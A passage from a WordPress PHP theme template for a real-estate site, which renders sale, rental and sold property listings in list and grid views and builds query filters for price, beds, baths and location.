									$project_status = get_field('sold_under_contract');
									if ($project_status == 1 || $project_status == 2) { ?>
                    					<div class="transparent-strip">
                        					<?php 
                        						if ($project_status == 1) :
                        							echo "Sold";
                    							elseif($project_status == 2) :
                    								echo "In Contract";
                    							endif;
                    						?>
                    					</div>
                					<?php } ?>
            					</div>
				                <div class="listing-content">
				                    <div class="row">
				                        <div class="col-sm-6 col-xs-12">
				                            <div class="prperty-n">
				                                <?php the_title(); ?> 
				                                <span>
				                                    <?php the_field("city"); ?>,
				                                    <?php the_field("zip_code"); ?>
			                                    </span>
			                                </div>
				                            <div class="prperty-des"> 
				                            	<span>Beds:
				                                    <?php the_field("bedrooms"); ?>
			                                    </span> 
			                                    <span>Baths:
				                                    <?php the_field("bathrooms"); ?>
			                                    </span> 
			                                    <span>Sq Ft.
			                                    	<?php 
				                                    	$building_size = get_field("building_size");
														echo (!empty($building_size)) ? number_format($building_size) : '';
													?>
												</span> 
											</div>
				                            <?php $state = get_field("state"); ?>
				                            <div class="prperty-des">
				                            	<span>
				                                    <?php echo $state->name; ?>
			                                    </span>
			                                </div>
				                            <?php 
				                            $agent = get_post_meta( get_the_ID(), 'agent', true );
				                            $user_info = get_userdata($agent)
				                            //$agent = get_post_meta( get_the_ID(), 'agent', true ); ?>
				                            <div class="prperty-des prperty-des2"> 
				                            	<span><i class="fa fa-user" aria-hidden="true"></i>
				                                    <?php echo $user_info->user_firstname; ?>
				                                    <?php echo $user_info->user_lastname; ?>
				                                </span> 
				                                <span><i class="fa fa-calendar" aria-hidden="true"></i>
				                                    <?php the_time(); ?>
				                                </span> 
				                            </div>
				                        </div>
                        				<div class="col-sm-6 col-xs-12">
                            				<?php 
                            					$sale_price = get_field("listing_price");
												$per_square = $sale_price / $building_size;
											?>
                            				<div class="prperty-price"> 
                            					$<?php echo number_format($sale_price); ?> 
                            					<span>
                            						$<?php echo number_format($per_square); ?> / sq. ft.
                            					</span> 
                            				</div>
											<?php
											$open_house_true 		= get_post_meta(get_the_ID(), 'open_house', true);
							          		$open_house_stare_date 	= get_post_meta(get_the_ID(), 'open_house_start_date', true);
							          		$open_house_end_date 	= get_post_meta(get_the_ID(), 'end_date', true);
							          		$open_house_start_time 	= get_post_meta(get_the_ID(), 'start_time', true);
							          		$open_house_end_time 	= get_post_meta(get_the_ID(), 'end_time', true);
							          		$day                    = get_field('day', get_the_ID());
							          		$todayDate  			= date('Y/m/d');
                            				$checkLastDate 			= date('Y/m/d', strtotime($open_house_end_date));
											if($open_house_true == 1 && $todayDate < $checkLastDate || $checkLastDate == $todayDate) :  
							                            $start_month= date('M', strtotime($open_house_stare_date)); 
							                            $start_date = date('dS', strtotime($open_house_stare_date));
							                            $end_month  = date('M', strtotime($open_house_end_date)); 
							                            $end_date   = date('dS', strtotime($open_house_end_date)); 
							                            $start_time = ltrim(date('h:ia', strtotime($open_house_start_time)), 0);
							                            $end_time   = ltrim(date('h:ia', strtotime($open_house_end_time)), 0); ?>
														<div class="custom-listing-open-house">
															<div class="inner-listing-open-house">
																<h4>Open House: 
								                                    <?php echo $day.', '.$start_month.' '.$start_date.', '; ?>
							                                        <?php echo $start_time.' - '.$end_time; ?>
								                                </h4>
															</div>
														</div>
												<?php else: ?>
                                						<!--<style>.custom-listing-open-house{display: none;}</style>-->
											<?php endif; ?>
				                            <div class="detail-btn"> 
				                            	<a href="<?php the_permalink(); ?>">Details</a> 
				                            </div>
				                        </div>
				                    </div>
				                </div>
				            </div>
			            <?php endwhile; ?>
			            <?php
							if (function_exists("pagination")) {
								if ($tab == 'sale') pagination($sale_query->max_num_pages, 'sale', $paged);
								else pagination($sale_query->max_num_pages, 'sale', 1);
							}
					}else { ?>
			            <div class="property-listing">
			                <h3 class="no_property">No Property Found</h3>
			            </div>
		            <?php } ?>
			</div>
        	<div id="forrent" class="listing-tab-content tab-pane fade <?php if($tab == 'rent'): echo 'in active'; else: echo ""; endif; ?>">
            	<?php
				$args = array(
					'post_type' => 'rental-listing',
					'post_status' => 'publish',
					'posts_per_page' => 10,
					'caller_get_posts' => 1,
					/*'meta_query' => array(
					array(
					'key' => 'listing_end',
					'value' => date('Y-m-d'),
					'compare' => '>='
					)
					)*/
				);
				if ($tab == "rent") {
					$args['paged'] = $paged;
				}

				if ($sortby == "recent") {
					$args['orderby'] = 'date';
					$args['order'] = 'DESC';
				}
				elseif ($sortby == "price_asc") {
					$args['meta_key'] = 'listing_price';
					$args['orderby'] = 'meta_value_num';
					$args['order'] = 'ASC';
				}
				elseif ($sortby == "price_desc") {
					$args['meta_key'] = 'listing_price';
					$args['orderby'] = 'meta_value_num';
					$args['order'] = 'DESC';
				}

				$rent_query = null;
				$rent_query = new WP_Query($args);
				if ($rent_query->have_posts()) {
					while ($rent_query->have_posts()):
						$rent_query->the_post(); ?>
            			<div class="property-listing">
                			<div class="listing-thumb">
                    			<?php
									$thumbnail = get_the_post_thumbnail_url(get_the_ID() , 'list-thumb');
									if (!empty($thumbnail)):
										echo '<img src="' . $thumbnail . '" alt="thumbnail">';
									else:
										echo '<img src="' . get_template_directory_uri() . '/images/thumbnail-255-170.jpg" alt="thumbnail">';
									endif;
									$project_status = get_field('sold_under_contract');
									if ($project_status == 1 || $project_status == 2) { ?>
                    					<div class="tradSparent-strip">
                        					<?php
												if ($project_status == 1) :
													echo "Sold";
												elseif($project_status == 2) :
													echo "In Contract";
												endif;
											?>
                    					</div>
                				<?php } ?>
            				</div>
                			<div class="listing-content">
			                    <div class="row">
			                        <div class="col-sm-6 col-xs-12">
			                            <div class="prperty-n">
			                                <?php the_title(); ?> 
			                                <span>
			                                    <?php the_field("city"); ?>,
			                                    <?php the_field("zip_code"); ?>
		                                    </span>
		                                </div>
			                            <div class="prperty-des"> 
			                            	<span>Beds:
			                                    <?php the_field("bedrooms"); ?>
		                                    </span> 
		                                    <span>Baths:
			                                    <?php the_field("bathrooms"); ?>
		                                    </span> 
		                                    <span>Sq Ft.
			                                    <?php 
			                                    	$building_size = get_field("building_size");
													echo (!empty($building_size)) ? number_format($building_size) : ''; 
												?>
											</span> 
										</div>
			                            <?php $state = get_field("state"); ?>
			                            <div class="prperty-des">
			                            	<span>
			                                    <?php echo $state->name; ?>
		                                    </span>
		                                </div>
			                            
                                     	<?php 
			                            $agent = get_post_meta( get_the_ID(), 'agent', true );
			                            $user_info = get_userdata($agent)
			                            //$agent = get_post_meta( get_the_ID(), 'agent', true ); ?>
			                            <div class="prperty-des prperty-des2"> 
			                            	<span><i class="fa fa-user" aria-hidden="true"></i>
			                                    <?php echo $user_info->user_firstname; ?>
			                                    <?php echo $user_info->user_lastname; ?>
			                                </span> 
			                                <span><i class="fa fa-calendar" aria-hidden="true"></i>
			                                    <?php the_time(); ?>
			                                </span> 
			                            </div>
		                        	</div>
			                        <div class="col-sm-6 col-xs-12">
			                            <?php 
			                            	$rent_price = get_field("listing_price");
											$per_square = $rent_price / $building_size;
										?>
			                            <div class="prperty-price"> 
			                            	$<?php echo number_format($rent_price); ?> 
			                            	<span>
			                            		$<?php echo number_format($per_square); ?> / sq. ft.
			                            	</span> 
			                            </div>
			                            <div class="detail-btn"> 
			                            	<a href="<?php the_permalink(); ?>">Details</a> 
			                            </div>
			                        </div>
			                    </div>
			                </div>
			            </div>
            		<?php endwhile; ?>
            		<?php
						if (function_exists("pagination")) {
							if ($tab == 'rent') pagination($rent_query->max_num_pages, 'rent', $paged);
							else pagination($rent_query->max_num_pages, 'rent', 1);
						}
					}
				else { ?>
		            <div class="property-listing">
		                <h3 class="no_property">No Property Found</h3>
		            </div>
            	<?php } ?>
        	</div>
			<div id="forsold" class="listing-tab-content tab-pane fade <?php if($tab == 'sold'): echo 'in active'; else: echo ""; endif; ?>">
            	<?php
				$args = array(
					'post_type' => array(
						'sale-listing',
						'rental-listing'
					),
					'post_status' => 'publish',
					'posts_per_page' => 10,
					'caller_get_posts' => 1,
					'meta_query' => array(
					array(
					'key' => 'sold_under_contract',
					'value' => '1',
					)
					)
				);
				if ($tab == "sold") {
					$args['paged'] = $paged;
				}

				if ($sortby == "recent") {
					$args['orderby'] = 'date';
					$args['order'] = 'DESC';
				}
				elseif ($sortby == "price_asc") {
					$args['meta_key'] = 'listing_price';
					$args['orderby'] = 'meta_value_num';
					$args['order'] = 'ASC';
				}
				elseif ($sortby == "price_desc") {
					$args['meta_key'] = 'listing_price';
					$args['orderby'] = 'meta_value_num';
					$args['order'] = 'DESC';
				}

				$sold_query = null;
				$sold_query = new WP_Query($args);
				if ($sold_query->have_posts()) {
					while ($sold_query->have_posts()):
						$sold_query->the_post(); ?>
            			<div class="property-listing">
                			<div class="listing-thumb">
                    			<?php
									$thumbnail = get_the_post_thumbnail_url(get_the_ID() , 'list-thumb');
									if (!empty($thumbnail)):
										echo '<img src="' . $thumbnail . '" alt="thumbnail">';
									else:
										echo '<img src="' . get_template_directory_uri() . '/images/thumbnail-255-170.jpg" alt="thumbnail">';
									endif;
									$project_status = get_field('sold_under_contract');
									if ($project_status == 1 || $project_status == 2) { ?>
                    					<div class="tradSparent-strip">
                        					<?php
												if ($project_status == 1) :
													echo "Sold";
												elseif($project_status == 2) :
													echo "In Contract";
												endif;
											?>
                    					</div>
                				<?php } ?>
            				</div>
                			<div class="listing-content">
			                    <div class="row">
			                        <div class="col-sm-6 col-xs-12">
			                            <div class="prperty-n">
			                                <?php the_title(); ?> 
			                                <span>
			                                    <?php the_field("city"); ?>,
			                                    <?php the_field("zip_code"); ?>
		                                    </span>
		                                </div>
			                            <div class="prperty-des"> 
			                            	<span>Beds:
			                                    <?php the_field("bedrooms"); ?>
		                                    </span> 
		                                    <span>Baths:
			                                    <?php the_field("bathrooms"); ?>
		                                    </span> 
		                                    <span>Sq Ft.
			                                    <?php 
			                                    	$building_size = get_field("building_size");
													echo (!empty($building_size)) ? number_format($building_size) : ''; 
												?>
											</span> 
										</div>
			                            <?php $state = get_field("state"); ?>
			                            <div class="prperty-des">
			                            	<span>
			                                    <?php echo $state->name; ?>
		                                    </span>
		                                </div>
			                            
                                     	<?php 
			                            $agent = get_post_meta( get_the_ID(), 'agent', true );
			                            $user_info = get_userdata($agent)
			                            //$agent = get_post_meta( get_the_ID(), 'agent', true ); ?>
			                            <div class="prperty-des prperty-des2"> 
			                            	<span><i class="fa fa-user" aria-hidden="true"></i>
			                                    <?php echo $user_info->user_firstname; ?>
			                                    <?php echo $user_info->user_lastname; ?>
			                                </span> 
			                                <span><i class="fa fa-calendar" aria-hidden="true"></i>
			                                    <?php the_time(); ?>
			                                </span> 
			                            </div>
		                        	</div>
			                        <div class="col-sm-6 col-xs-12">
			                            <?php 
			                            	$rent_price = get_field("listing_price");
											$per_square = $rent_price / $building_size;
										?>
			                            <div class="prperty-price"> 
			                            	$<?php echo number_format($rent_price); ?> 
			                            	<span>
			                            		$<?php echo number_format($per_square); ?> / sq. ft.
			                            	</span> 
			                            </div>
			                            <div class="detail-btn"> 
			                            	<a href="<?php the_permalink(); ?>">Details</a> 
			                            </div>
			                        </div>
			                    </div>
			                </div>
			            </div>
            		<?php endwhile; ?>
            		<?php
						if (function_exists("pagination")) {
							if ($tab == 'sold') pagination($sold_query->max_num_pages, 'sold', $paged);
							else pagination($sold_query->max_num_pages, 'sold', 1);
						}
					}
				else { ?>
		            <div class="property-listing">
		                <h3 class="no_property">No Property Found</h3>
		            </div>
            	<?php } ?>
        	</div>
			
			
    	</div>
	</div>
	<div class="grid-outer" style="display:none;">
    	<div class="tab-content">
        	 <div id="allgrid" class="grid-tab-content tab-pane fade <?php if($tab == 'all'): echo 'in active'; else: echo ""; endif; ?>">
            <?php
		if ($all_query->have_posts()) {
?>
            <ul>
                <?php
			while ($all_query->have_posts()):
				$all_query->the_post();
				$building_size = get_field("building_size");
?>
                <li>
                    <div class="pro-img">
                        <?php
				$thumbnail = get_the_post_thumbnail_url(get_the_ID() , 'grid-thumb');
				if (!empty($thumbnail)) echo '<img src="' . $thumbnail . '" alt="thumbnail">';
				else echo '<img src="' . get_template_directory_uri() . '/images/thumbnail-385-260.jpg" alt="thumbnail">';
				$project_status = get_field('sold_under_contract');
				if ($project_status == 1 || $project_status == 2) {
?>
                        <div class="tradSparent-strip">
                            <?php
					if ($project_status == 1) echo "Sold";
					elseif ($project_status == 2) echo "In Contract";
?>
                        </div>
                        <?php
				}

				$price = get_field("listing_price");
				$per_square = $price / $building_size;
?>
                        <div class="prperty-p">$
                            <?php
				echo number_format($price); ?> <span>
                                <?php
				echo number_format($per_square); ?> / sq. ft. </span></div>
                    </div>
                    <div class="prperty-cnt">
                        <div class="pro-n">
                            <?php
				the_title(); ?> <span>
                                <?php
				the_field("city"); ?>,
                                <?php
				the_field("zip_code"); ?></span> </div>
                        <div class="prperty-des"> <span>Beds:
                                <?php
				the_field("bedrooms"); ?></span> <span>Baths:
                                <?php
				the_field("bathrooms"); ?></span> <span>Sq Ft.
                                <?php
				echo (!empty($building_size)) ? number_format($building_size) : ''; ?></span> </div>
                        <?php
				$state = get_field("state");
?>
                        <div class="prperty-des"> <span>
                                <?php
				echo $state->name; ?></span> </div>

                        <div class="detail-btn"> <a href="<?php
				the_permalink(); ?>">Details</a> </div>
                    </div>
                    <?php
                    
				$agent = get_post_meta( get_the_ID(), 'agent', true ); ?>
                    <div class="prperty-des2"> <span><i class="fa fa-user" aria-hidden="true"></i>
                            <?php
				echo $user_info->user_firstname; ?>
                            <?php
				echo $user_info->user_lastname; ?> </span> <span class="pull-right"><i class="fa fa-calendar" aria-hidden="true"></i>
                            <?php
				the_time(); ?></span> </div>
                </li>
                <?php
			endwhile;
			if (function_exists("pagination")) {
				if ($tab == 'all') pagination($all_query->max_num_pages, 'all', $paged);
				else pagination($all_query->max_num_pages, 'all', 1);
			}

?>
            </ul>
            <?php
		}
		else { ?>
            <div class="property-listing">
                <h3 class="no_property">No Property Found</h3>
            </div>
            <?php
		}

?>
        </div>
         <div id="forsalegrid" class="grid-tab-content tab-pane fade in <?php if($tab == 'sale'): echo 'in active'; else: echo ""; endif; ?>">
            <?php
		if ($sale_query->have_posts()) {
?>
            <ul>
                <?php
			while ($sale_query->have_posts()):
				$sale_query->the_post(); ?>
                <li>
                    <div class="pro-img">
                        <?php
				$thumbnail = get_the_post_thumbnail_url(get_the_ID() , 'grid-thumb');
				if (!empty($thumbnail)) echo '<img src="' . $thumbnail . '" alt="thumbnail">';
				else echo '<img src="' . get_template_directory_uri() . '/images/thumbnail-385-260.jpg" alt="thumbnail">';
				$project_status = get_field('sold_under_contract');
				if ($project_status == 1 || $project_status == 2) {
?>
                        <div class="tradSparent-strip">
                            <?php
					if ($project_status == 1) echo "Sold";
					elseif ($project_status == 2) echo "In Contract";
?>
                        </div>
                        <?php
				}

				$price = get_field("listing_price");
				$per_square = $price / $building_size;
?>
                        <div class="prperty-p">$
                            <?php
				echo number_format($price); ?> <span>
                                <?php
				echo number_format($per_square); ?> / sq. ft. </span></div>
                    </div>
                    <div class="prperty-cnt">
                        <div class="pro-n">
                            <?php
				the_title(); ?> <span>
                                <?php
				the_field("city"); ?>,
                                <?php
				the_field("zip_code"); ?></span> </div>
                        <div class="prperty-des"> <span>Beds:
                                <?php
				the_field("bedrooms"); ?></span> <span>Baths:
                                <?php
				the_field("bathrooms"); ?></span> <span>Sq Ft.
                                <?php
				echo (!empty($building_size)) ? number_format($building_size) : ''; ?></span> </div>
                        <?php
				$state = get_field("state");
?>
                        <div class="prperty-des"> <span>
                                <?php
				echo $state->name; ?></span> </div>
                        <div class="detail-btn"> <a href="<?php
				the_permalink(); ?>">Details</a> </div>
                    </div>
                    <?php
				$agent = get_post_meta( get_the_ID(), 'agent', true ); ?>
                    <div class="prperty-des2"> <span><i class="fa fa-user" aria-hidden="true"></i>
                            <?php
				echo $user_info->user_firstname; ?>
                            <?php
				echo $user_info->user_lastname; ?> </span> <span class="pull-right"><i class="fa fa-calendar" aria-hidden="true"></i>
                            <?php
				the_time(); ?></span> </div>
                </li>
                <?php
			endwhile;
			if (function_exists("pagination")) {
				if ($tab == "sale") pagination($sale_query->max_num_pages, 'sale', $paged);
				else pagination($sale_query->max_num_pages, 'sale', 1);
			}

?>
            </ul>
            <?php
		}
		else { ?>
            <div class="property-listing">
                <h3 class="no_property">No Property Found</h3>
            </div>
            <?php
		}

?>
        </div>
         <div id="forrentgrid" class="grid-tab-content tab-pane fade <?php if($tab == 'rent'): echo 'in active'; else: echo ""; endif; ?>">
            <?php
		if ($rent_query->have_posts()) {
?>
            <ul>
                <?php
			while ($rent_query->have_posts()):
				$rent_query->the_post(); ?>
                <li>
                    <div class="pro-img">
                        <?php
				$thumbnail = get_the_post_thumbnail_url(get_the_ID() , 'grid-thumb');
				if (!empty($thumbnail)) echo '<img src="' . $thumbnail . '" alt="thumbnail">';
				else echo '<img src="' . get_template_directory_uri() . '/images/thumbnail-385-260.jpg" alt="thumbnail">';
				$project_status = get_field('sold_under_contract');
				if ($project_status == 1 || $project_status == 2) {
?>
                        <div class="tradSparent-strip">
                            <?php
					if ($project_status == 1) echo "Sold";
					elseif ($project_status == 2) echo "In Contract";
?>
                        </div>
                        <?php
				}

				$rent_price = get_field("listing_price");
				$per_square = $price / $building_size;
?>
                        <div class="prperty-p">$
                            <?php
				echo number_format($rent_price); ?> <span>
                                <?php
				echo number_format($per_square); ?> / sq. ft. </span></div>
                    </div>
                    <div class="prperty-cnt">
                        <div class="pro-n">
                            <?php
				the_title(); ?> <span>
                                <?php
				the_field("city"); ?>,
                                <?php
				the_field("zip_code"); ?></span> </div>
                        <div class="prperty-des"> <span>Beds:
                                <?php
				the_field("bedrooms"); ?></span> <span>Baths:
                                <?php
				the_field("bathrooms"); ?></span> <span>Sq Ft.
                                <?php
				echo (!empty($building_size)) ? number_format($building_size) : ''; ?></span> </div>
                        <?php
				$state = get_field("state");
?>
                        <div class="prperty-des"> <span>
                                <?php
				echo $state->name; ?></span> </div>
                        <div class="detail-btn"> <a href="<?php
				the_permalink(); ?>">Details</a> </div>
                    </div>
                    <?php
				$agent = get_post_meta( get_the_ID(), 'agent', true ); ?>
                    <div class="prperty-des2"> <span><i class="fa fa-user" aria-hidden="true"></i>
                            <?php
				echo $user_info->user_firstname; ?>
                            <?php
				echo $user_info->user_lastname; ?> </span> <span class="pull-right"><i class="fa fa-calendar" aria-hidden="true"></i>
                            <?php
				the_time(); ?></span> </div>
                </li>
                <?php
			endwhile;
			if (function_exists("pagination")) {
				if ($tab == "rent") pagination($rent_query->max_num_pages, 'rent', $paged);
				else pagination($rent_query->max_num_pages, 'rent', 1);
			}

?>
            </ul>
            <?php
		}
		else { ?>
            <div class="property-listing">
                <h3 class="no_property">No Property Found</h3>
            </div>
            <?php
		}

		wp_reset_postdata();
?>
        </div>
		<div id="forsoldgrid" class="grid-tab-content tab-pane fade <?php if($tab == 'sold'): echo 'in active'; else: echo ""; endif; ?>">
            <?php
		if ($sold_query->have_posts()) {
?>
            <ul>
                <?php
			while ($sold_query->have_posts()):
				$sold_query->the_post(); ?>
                <li>
                    <div class="pro-img">
                        <?php
				$thumbnail = get_the_post_thumbnail_url(get_the_ID() , 'grid-thumb');
				if (!empty($thumbnail)) echo '<img src="' . $thumbnail . '" alt="thumbnail">';
				else echo '<img src="' . get_template_directory_uri() . '/images/thumbnail-385-260.jpg" alt="thumbnail">';
				$project_status = get_field('sold_under_contract');
				if ($project_status == 1 || $project_status == 2) {
?>
                        <div class="tradSparent-strip">
                            <?php
					if ($project_status == 1) echo "Sold";
					elseif ($project_status == 2) echo "In Contract";
?>
                        </div>
                        <?php
				}

				$rent_price = get_field("listing_price");
				$per_square = $price / $building_size;
?>
                        <div class="prperty-p">$
                            <?php
				echo number_format($rent_price); ?> <span>
                                <?php
				echo number_format($per_square); ?> / sq. ft. </span></div>
                    </div>
                    <div class="prperty-cnt">
                        <div class="pro-n">
                            <?php
				the_title(); ?> <span>
                                <?php
				the_field("city"); ?>,
                                <?php
				the_field("zip_code"); ?></span> </div>
                        <div class="prperty-des"> <span>Beds:
                                <?php
				the_field("bedrooms"); ?></span> <span>Baths:
                                <?php
				the_field("bathrooms"); ?></span> <span>Sq Ft.
                                <?php
				echo (!empty($building_size)) ? number_format($building_size) : ''; ?></span> </div>
                        <?php
				$state = get_field("state");
?>
                        <div class="prperty-des"> <span>
                                <?php
				echo $state->name; ?></span> </div>
                        <div class="detail-btn"> <a href="<?php
				the_permalink(); ?>">Details</a> </div>
                    </div>
                    <?php
				$agent = get_post_meta( get_the_ID(), 'agent', true ); ?>
                    <div class="prperty-des2"> <span><i class="fa fa-user" aria-hidden="true"></i>
                            <?php
				echo $user_info->user_firstname; ?>
                            <?php
				echo $user_info->user_lastname; ?> </span> <span class="pull-right"><i class="fa fa-calendar" aria-hidden="true"></i>
                            <?php
				the_time(); ?></span> </div>
                </li>
                <?php
			endwhile;
			if (function_exists("pagination")) {
				if ($tab == "sold") pagination($sold_query->max_num_pages, 'sold', $paged);
				else pagination($sold_query->max_num_pages, 'sold', 1);
			}

?>
            </ul>
            <?php
		}
		else { ?>
            <div class="property-listing">
                <h3 class="no_property">No Property Found</h3>
            </div>
            <?php
		}

		wp_reset_postdata();
?>
        </div>
    </div>
</div>
<?php
	}
	else {

		// for filter functionality

		$args = array(
			'post_status' => 'publish',
			'posts_per_page' => -1
		);
		if (!empty($paged)) {
			$args['paged'] = $paged;
		}

		if ($sortby == "recent") {
			$args['orderby'] = 'date';
			$args['order'] = 'DESC';
		}
		elseif ($sortby == "price_asc") {
			$args['meta_key'] = 'listing_price';
			$args['orderby'] = 'meta_value_num';
			$args['order'] = 'ASC';
		}
		elseif ($sortby == "price_desc") {
			$args['meta_key'] = 'listing_price';
			$args['orderby'] = 'meta_value_num';
			$args['order'] = 'DESC';
		}

		if ($filter_property_type == "buy") $args['post_type'] = 'sale-listing';
		elseif ($filter_property_type == "rent") $args['post_type'] = 'rental-listing';
		elseif ($filter_property_type == "sold") $args['post_type'] =array(
						'sale-listing',
						'rental-listing'
					);
				
		$meta_query['relation'] = 'AND';
		$i = 0;
		if($filter_property_type == "sold")	
				{
				$meta_query[] = array(
					'key' => 'sold_under_contract',
					'value' => '1',
				);
				
				}
				if($filter_property_type == "buy")	
				{
				$meta_query[] = array(
					'key' => 'sold_under_contract',
					'value' => '1',
					'compare' => '!=',
				);
				
				}
		if (!empty($filter_address)) {
			$post_exit = get_post($filter_address);
			if (empty($post_exit)) {

				$address = array(
					'relation' => 'OR',
					array(
						'key' => 'address',
						'value' => $filter_address,
						'compare' => 'LIKE'
					),
					array(
						'key' => 'unit',
						'value' => $filter_address,
						'compare' => 'LIKE'
					),
					array(
						'key' => 'city',
						'value' => $filter_address,
						'compare' => 'LIKE'
					),
					array(
						'key' => 'zip_code',
						'value' => $filter_address,
						'compare' => 'LIKE'
					),
					
				);
				$termargs = array(
					'taxonomy'               => 'state',
					'fields'      => 'ids', // Retrieve only term IDs
					'orderby'                => 'name',
					'order'                  => 'ASC',
					'hide_empty'             => false,
					'name__like'			 => $filter_address, // Replace 'pattern' with the substring you want to match

				);
				$the_query = new WP_Term_Query($termargs);
				if($the_query->get_terms()){
					$address[] = array(
							'key' => 'state',
							'value' => $the_query->get_terms(),
							'compare' => 'IN',
           					 'type'    => 'NUMERIC'
						);
					
				}
				$meta_query[] = $address;
				
				
				
				

				
			}
			else {
				$args['post__in'] = array(
					$filter_address
				);
			}

			$i++;
		}

		if ($filter_building_type != '') {
			$args['tax_query'] = array(
				array(
					'taxonomy' => 'building-style',
					'field' => 'term_id',
					'terms' => array(
						$filter_building_type
					) ,
				) ,
			);
		}

		if ($area != '') {
			$args['tax_query'] = array(
				array(
					'taxonomy' => 'neighbourhood',
					'field' => 'term_id',
					'terms' => array(
						$area
					) ,
				) ,
			);
		}

		if ($property_type != '') {
			$args['tax_query'] = array(
				array(
					'taxonomy' => 'building-style',
					'field' => 'term_id',
					'terms' => $property_type,
				) ,
			);
			$args['post_type'] = array(
				'sale-listing',
				'rental-listing'
			);
		}

		/*$meta_query[] = array(
		'key' => 'listing_end',
		'value' => date('Y-m-d'),
		'compare' => '>='
		);*/
		if (!empty($filter_beds)) {
			if ($filter_beds != "5+") {
				$meta_query[] = array(
					'key' => 'bedrooms',
					'value' => $filter_beds,
					'compare' => '=',
					'type'    => 'NUMERIC', // Ensure this is set to NUMERIC

				);
			}
			else {
				$meta_query[] = array(
					'key' => 'bedrooms',
					'value' => 5,
					'compare' => '>',
					'type'    => 'NUMERIC', // Ensure this is set to NUMERIC

				);
			}
		}

		if (!empty($listing_status)) {
			$meta_query[] = array(
				'key' => 'listing_status',
				'value' => $listing_status,
				'compare' => '='
			);
		}

		if (!empty($filter_baths)) {
			if ($filter_baths != "5+") {
				$meta_query[] = array(
					'key' => 'bathrooms',
					'value' => $filter_baths,
					'compare' => '=',
					'type'    => 'NUMERIC', // Ensure this is set to NUMERIC

				);
			}
			else {
				$meta_query[] = array(
					'key' => 'bedrooms',
					'value' => 5,
					'compare' => '>',
					'type'    => 'NUMERIC', // Ensure this is set to NUMERIC

				);
			}
		}

		if (!empty($building_min_area)) {
			$meta_query[] = array(
				'key' => 'building_size',
				'value' => $building_min_area,
				'compare' => '>=',
				'type'    => 'NUMERIC', // Ensure this is set to NUMERIC

			);
		}

		if (!empty($building_max_area)) {
			$meta_query[] = array(
				'key' => 'building_size',
				'value' => $building_max_area,
				'compare' => '<=',
				'type'    => 'NUMERIC', // Ensure this is set to NUMERIC

			);
		}

		if (!empty($slidemin) && !empty($slidemax)) {
			// $meta_query[] = array(
			// 	'relation' => 'AND',
			// 	array(
			// 		'key' => 'listing_price',
			// 		'value' => $slidemin,
			// 		'compare' => '>='
			// 	),
			// 	array(
			// 		'key' => 'listing_price',
			// 		'value' => $slidemax,
			// 		'compare' => '<='
			// 	)
			// );
			$meta_query['relation'] = 'AND';
			$meta_query[] = array(
				'key' => 'listing_price',
				'value' => array($slidemin,$slidemax),
				'compare' => 'BETWEEN',
				'type'    => 'NUMERIC', // Ensure this is set to NUMERIC

			);
			
			
		}
		// $meta_query[] = array(
		// 	'key' => 'listing_end',
		// 	'value' => date('Y-m-d'),
		// 	'compare' => '>='
		// );
		$args['meta_query'] = $meta_query;
		pre($args);
		
?>
<div class="listing-outer" style="margin-top:15px;">
    <div class="tab-content">
        <div id="forsale" class="listing-tab-content tab-pane fade in active">
            <?php
		$my_query = null;
		$my_query = new WP_Query($args);
		
		if ($my_query->have_posts()) {
			while ($my_query->have_posts()):
				$my_query->the_post();
?>
            <div class="property-listing">
                <div class="listing-thumb">
                    <?php
				$thumbnail = get_the_post_thumbnail_url(get_the_ID() , 'list-thumb');
				if (!empty($thumbnail)) echo '<img src="' . $thumbnail . '" alt="thumbnail">';
				else echo '<img src="' . get_template_directory_uri() . '/images/thumbnail-255-170.jpg" alt="thumbnail">';
				$project_status = get_field('sold_under_contract');
				if ($project_status == 1 || $project_status == 2) {
?>
                    <div class="tradSparent-strip">
                        <?php
					if ($project_status == 1) echo "Sold";
					elseif ($project_status == 2) echo "In Contract";
?>
                    </div>
                    <?php
				} ?>
                </div>
                <div class="listing-content">
                    <div class="row">
                        <div class="col-sm-6 col-xs-12">
                        <?php
						$status = get_post_meta(get_the_ID(), 'sold_under_contract', true);
						$property_post_type = get_post_type();
						   if ($property_post_type == 'sale-listing' and $status != 1) { ?>
							   <div class="for-sale">
								   <span>For Sale</span>
							   </div>
						   <?php }else if($status == 1){ ?>
								   <div class="for-sale">
								   <span><?php echo 'Sold'; ?></span>
							   </div>
						  <?php	}else{ ?>
							   <div class="for-sale">
								   <span>For Rent</span>
							   </div>
						   <?php } ?>
                            <div class="prperty-n">
                                <?php
				the_title(); ?> <span>
                                    <?php
				the_field("city"); ?>,
                                    <?php
				the_field("zip_code"); ?></span></div>
                            <div class="prperty-des"> <span>Beds:
                                    <?php
				the_field("bedrooms"); ?></span> <span>Baths:
                                    <?php
				the_field("bathrooms"); ?></span> <span>Sq Ft.
                                    <?php
				$building_size = get_field("building_size");
				echo (!empty($building_size)) ? number_format($building_size) : ''; ?></span> </div>
                            <?php
				$state = get_field("state");
?>
                            <div class="prperty-des"><span>
                                    <?php
				echo $state->name; ?></span></div>
                            <?php
				$agent = get_post_meta( get_the_ID(), 'agent', true ); ?>
                            <div class="prperty-des prperty-des2"> <span><i class="fa fa-user" aria-hidden="true"></i>
                                    <?php
				echo $user_info->user_firstname; ?>
                                    <?php
				echo $user_info->user_lastname; ?></span> <span><i class="fa fa-calendar" aria-hidden="true"></i>
                                    <?php
				the_time(); ?></span> </div>
                        </div>
                        <div class="col-sm-6 col-xs-12">
                            <?php
				$sale_price = get_field("listing_price");
				$per_square = $sale_price / $building_size;
?>
                            <div class="prperty-price"> $
                                <?php
				echo number_format($sale_price); ?> <span>$
                                    <?php
				echo number_format($per_square); ?> / sq. ft.</span> </div>

                            <div class="detail-btn"> <a href="<?php
				the_permalink(); ?>">Details</a> </div>
                        </div>
                    </div>
                </div>
            </div>
            <?php
			endwhile;
			if (function_exists("pagination")) {
				pagination($my_query->max_num_pages, '', $paged);
			}
		}
		else {
?>
            <div class="property-listing">
                <h3 class="no_property">No Property Found</h3>
            </div>
            <?php
		}

		wp_reset_postdata();
?>
        </div>
    </div>
</div>
<div class="grid-outer" style="display:none;margin-top:15px">
    <div class="tab-content">
        <div id="forsalegrid" class="grid-tab-content tab-pane fade in active">
            <?php
		$my_query = new WP_Query($args);
		if ($my_query->have_posts()) {
?>
            <ul>
                <?php
			while ($my_query->have_posts()):
				$my_query->the_post(); ?>
                <li>
                    <div class="pro-img">
                        <?php
				$thumbnail = get_the_post_thumbnail_url(get_the_ID() , 'grid-thumb');
				if (!empty($thumbnail)) echo '<img src="' . $thumbnail . '" alt="thumbnail">';
